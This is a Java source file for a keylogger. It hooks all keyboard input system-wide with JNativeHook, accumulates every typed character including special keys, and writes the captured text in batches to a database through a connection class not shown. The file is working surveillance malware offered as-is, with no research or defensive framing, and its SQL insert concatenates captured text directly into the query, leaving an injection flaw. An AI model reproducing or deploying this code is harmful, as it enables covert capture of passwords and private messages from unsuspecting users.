/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package keylogger;

import java.io.Serializable;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * Class Created With ♥ By Med Reda
 */
@Entity
public class KeyLog implements Serializable,NativeKeyListener {
    private static final long serialVersionUID = 1L;
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;
    public KeyLog(){
        c = new CNX();
        try{
            GlobalScreen.registerNativeHook();
        }catch(NativeHookException e){
        }
        GlobalScreen.addNativeKeyListener(this);
    }
    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    @Override
    public int hashCode() {
        int hash = 0;
        hash += (id != null ? id.hashCode() : 0);
        return hash;
    }

    @Override
    public boolean equals(Object object) {
        // TODO: Warning - this method won't work in the case the id fields are not set
        if (!(object instanceof KeyLog)) {
            return false;
        }
        KeyLog other = (KeyLog) object;
        if ((this.id == null && other.id != null) || (this.id != null && !this.id.equals(other.id))) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return "keylogger.KeyLog[ id=" + id + " ]";
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }
    String s="";
    CNX c ;
    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
         if(nke.getKeyChar() == 27 ) s+= "ESC";
        else if(nke.getKeyChar() == 13 ) s += "\n";
        else if(nke.getKeyChar() == 8 ) s += "[DELETE]";
        else if(nke.getKeyChar() == 9 ) s += "[TAB]";
        else s += nke.getKeyChar();
        if(s.length() > 150 ) {
            try {
                Statement st = c.con.createStatement();
                String sql = "INSERT INTO `Table`( `text`) VALUES ('"+s+"')";
                st.executeUpdate(sql);
                s= "";
            } catch (SQLException ex) {
                Logger.getLogger(KeyLog.class.getName()).log(Level.SEVERE, null, ex);
            }
        }    
    }
    public static void main(String[] args){
        KeyLog d = new KeyLog();
    }

}
